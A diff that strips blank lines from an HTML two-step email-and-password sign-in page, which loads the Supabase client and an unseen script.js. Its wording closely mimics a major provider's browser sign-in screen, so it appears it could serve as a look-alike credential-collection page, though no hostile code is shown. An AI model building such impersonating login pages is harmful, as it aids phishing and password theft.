@@ -7,7 +7,6 @@
   <link rel="stylesheet" href="styles.css">
 </head>
 <body class="center-body">
-
   <!-- Direct Login View (Landing button step removed) -->
   <div id="login-view" class="split-card">
     
@@ -22,7 +21,6 @@
         <span class="line-one">with your Account to continue. This account will be</span><br>
         available in the browser.
       </p>
-
       <div class="email-chip hidden" id="email-chip">
         <svg class="chip-icon" viewBox="0 0 24 24" fill="currentColor">
           <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-3.8-.85-5.05-2.2.04-1.67 3.33-2.6 5.05-2.6s5.01.93 5.05 2.6C15.8 19.15 14.03 20 12 20z"/>
@@ -33,7 +31,6 @@
         </svg>
       </div>
     </div>
-
     <!-- RIGHT COLUMN -->
     <div class="right-col">
       <!-- Step 1: Email Input (Active Immediately) -->
@@ -47,7 +44,6 @@
         </div>
         <button class="btn" id="btn-next">Next</button>
       </div>
-
       <!-- Step 2: Password Input -->
       <div id="step-password" class="hidden">
         <div class="form-group">
@@ -55,18 +51,15 @@
             <input type="password" id="password" placeholder=" ">
             <label for="password" class="floating-label">Enter your password</label>
           </div>
-
           <div class="show-password-wrapper">
             <input type="checkbox" id="toggle-password">
             <label for="toggle-password">Show password</label>
           </div>
-
           <div class="error-msg" id="pass-error">Password is required.</div>
         </div>
         
         <button class="btn" id="btn-login">Next</button>
       </div>
-
       <!-- Step 3: Loading State -->
       <div id="step-loading" class="hidden text-center">
         <div class="spinner"></div>
@@ -74,9 +67,7 @@
         <p class="user-email-display" id="loading-display-email" style="margin-top: 8px;"></p>
       </div>
     </div>
-
   </div>
-
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="script.js"></script>
 </body>
